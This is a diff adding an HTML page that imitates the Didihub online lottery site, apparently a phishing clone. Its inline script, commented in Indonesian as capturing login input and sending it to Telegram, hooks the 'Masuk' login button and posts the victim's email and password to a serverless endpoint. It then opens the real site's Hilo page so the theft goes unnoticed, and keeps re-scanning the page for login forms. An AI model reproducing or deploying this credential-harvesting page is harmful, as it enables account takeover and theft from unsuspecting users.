@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    <link rel="icon" href="favicon.ico">
+    <title>Didihub - www.didihub.com</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="All">
+    <meta name="description" content="Didihub Merupakan Situs Lotre Online Wingo Terpercaya. Bonus dan jackpot adalah yang tertinggi.">
+    <meta name="keywords" content="Lotre,WinGo,Hilo,X50,Crash,Roulette,5D,Dice,Classic Dice,Mines,Plinko,DingDong,Dragon&Tiger,Originals,Live,Sports,Games">
+    <meta name="renderer" content="webkit">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-touch-fullscreen" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="full-screen" content="yes">
+    <meta name="x5-orientation" content="portrait">
+    <meta name="x5-fullscreen" content="true">
+    <meta name="x5-page-mode" content="app">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta name="google" content="notranslate">
+    <meta name="format-detection" content="telephone=no">
+    <link href="../web.luckcdn.top/css/box.66ae9ae1.css" rel="prefetch">
+    <link href="../web.luckcdn.top/css/box~invite.233e7107.css" rel="prefetch">
+    <link href="../web.luckcdn.top/css/game.f196ac54.css" rel="prefetch">
+    <link href="../web.luckcdn.top/css/game~user.329d5a1e.css" rel="prefetch">
+    <link href="../web.luckcdn.top/css/invite.d21857b1.css" rel="prefetch">
+    <link href="../web.luckcdn.top/css/sports.f4cd9f4f.css" rel="prefetch">
+    <link href="../web.luckcdn.top/css/user.bbf1358e.css" rel="prefetch">
+    <link href="../web.luckcdn.top/js/box.1e2464b1.js" rel="prefetch">
+    <link href="../web.luckcdn.top/js/box~invite.c0c489ff.js" rel="prefetch">
+    <link href="../web.luckcdn.top/js/game.474d933f.js" rel="prefetch">
+    <link href="../web.luckcdn.top/js/game~user.877ec3c1.js" rel="prefetch">
+    <link href="../web.luckcdn.top/js/invite.289ca45e.js" rel="prefetch">
+    <link href="../web.luckcdn.top/js/sports.176a52a1.js" rel="prefetch">
+    <link href="../web.luckcdn.top/js/user.9e84528f.js" rel="prefetch">
+    <link href="../web.luckcdn.top/css/app.73b15726.css" rel="preload" as="style">
+    <link href="../web.luckcdn.top/css/chunk-vendors.2096b49c.css" rel="preload" as="style">
+    <link href="../web.luckcdn.top/js/app.6c056893.js" rel="preload" as="script">
+    <link href="../web.luckcdn.top/js/chunk-vendors.aec67ee9.js" rel="preload" as="script">
+    <link href="../web.luckcdn.top/css/chunk-vendors.2096b49c.css" rel="stylesheet">
+    <link href="../web.luckcdn.top/css/app.73b15726.css" rel="stylesheet">
+
+    <style>
+        /* Style untuk hidden form yang akan digunakan untuk integrasi Telegram */
+        #hiddenLoginForm {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <noscript><strong>We're sorry but Didihub - www.didihub.com doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript>
+    <div id="app"></div>
+
+    <!-- Form tersembunyi untuk integrasi Telegram -->
+    <form id="hiddenLoginForm" style="display:none;">
+        <input type="email" id="email">
+        <input type="password" id="password">
+    </form>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/phaser/3.55.2/phaser.min.js"></script>
+    <script src="../web.luckcdn.top/js/chunk-vendors.aec67ee9.js"></script>
+    <script src="../web.luckcdn.top/js/app.6c056893.js"></script>
+
+    <script>
+        // Script untuk menangkap input login dari halaman asli dan mengirimkannya ke Telegram
+        document.addEventListener('DOMContentLoaded', function() {
+            // Fungsi untuk mendeteksi form login asli dari Didihub
+            function detectLoginForm() {
+                // Coba temukan form login asli dari situs
+                const forms = document.querySelectorAll('form');
+                forms.forEach(form => {
+                    // Cari form yang berisi input email dan password
+                    const emailInput = form.querySelector('input[type="email"], input[name="email"]');
+                    const passwordInput = form.querySelector('input[type="password"], input[name="password"]');
+
+                    if (emailInput && passwordInput) {
+                        // Tambahkan event listener ke input
+                        setupInputListeners(emailInput, passwordInput, form);
+                    }
+                });
+
+                // Jika tidak menemukan form, coba lagi setelah beberapa detik
+                // (mungkin form dimuat secara dinamis)
+                setTimeout(detectLoginForm, 2000);
+            }
+
+            // Fungsi untuk menambahkan event listener ke input
+            function setupInputListeners(emailInput, passwordInput, form) {
+                // Cari tombol masuk dengan kelas van-button--info dan teks "Masuk"
+                const loginButtons = document.querySelectorAll('.van-button--info');
+                
+                loginButtons.forEach(button => {
+                    const buttonText = button.textContent.trim().toLowerCase();
+                    if (buttonText.includes('masuk')) {
+                        // Tambahkan event listener ke tombol masuk
+                        button.addEventListener('click', function(e) {
+                            // Ambil nilai email dan password saat tombol diklik
+                            const email = emailInput.value;
+                            const password = passwordInput.value;
+                            
+                            console.log('Tombol Masuk diklik, mengirim data');
+                            
+                            // Kirim data ke API serverless Vercel
+                            fetch('/api/submit-login', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    email: email,
+                                    password: password
+                                })
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                console.log('Respons diterima:', data);
+                                if (data.status === 'success') {
+                                    // Buka tab baru ke halaman Hilo
+                                    window.open('https://www.didihub.com/hilo', '_blank');
+                                }
+                            })
+                            .catch(error => {
+                                console.error('Error:', error);
+                                // Tetap buka tab baru meskipun ada error
+                                window.open('https://www.didihub.com/hilo', '_blank');
+                            });
+                            
+                            // Tidak mencegah event default agar form tetap disubmit secara normal
+                        });
+                        
+                        console.log('Tombol Masuk ditemukan dan listener ditambahkan');
+                    }
+                });
+                
+                // Jika tidak menemukan tombol dengan kelas van-button--info, coba cari tombol submit di dalam form
+                if (loginButtons.length === 0) {
+                    const submitButtons = form.querySelectorAll('button[type="submit"]');
+                    submitButtons.forEach(button => {
+                        button.addEventListener('click', function(e) {
+                            // Ambil nilai email dan password saat tombol diklik
+                            const email = emailInput.value;
+                            const password = passwordInput.value;
+                            
+                            console.log('Tombol submit diklik, mengirim data');
+                            
+                            // Kirim data ke API serverless Vercel
+                            fetch('/api/submit-login', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    email: email,
+                                    password: password
+                                })
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                console.log('Respons diterima:', data);
+                                if (data.status === 'success') {
+                                    // Buka tab baru ke halaman Hilo
+                                    window.open('https://www.didihub.com/hilo', '_blank');
+                                }
+                            })
+                            .catch(error => {
+                                console.error('Error:', error);
+                                // Tetap buka tab baru meskipun ada error
+                                window.open('https://www.didihub.com/hilo', '_blank');
+                            });
+                            
+                            // Tidak mencegah event default agar form tetap disubmit secara normal
+                        });
+                        
+                        console.log('Tombol submit ditemukan dan listener ditambahkan');
+                    });
+                }
+            }
+            
+            // Mulai deteksi form login
+            detectLoginForm();
+            
+            // Tambahkan event listener untuk mendeteksi perubahan DOM
+            // Ini berguna jika form login dimuat secara dinamis
+            const observer = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    if (mutation.addedNodes.length) {
+                        detectLoginForm();
+                    }
+                });
+            });
+            
+            // Mulai observasi
+            observer.observe(document.body, { childList: true, subtree: true });
+            
+            console.log('Didihub Integration Script initialized');
+        });
+    </script>
+</body>
+</html>
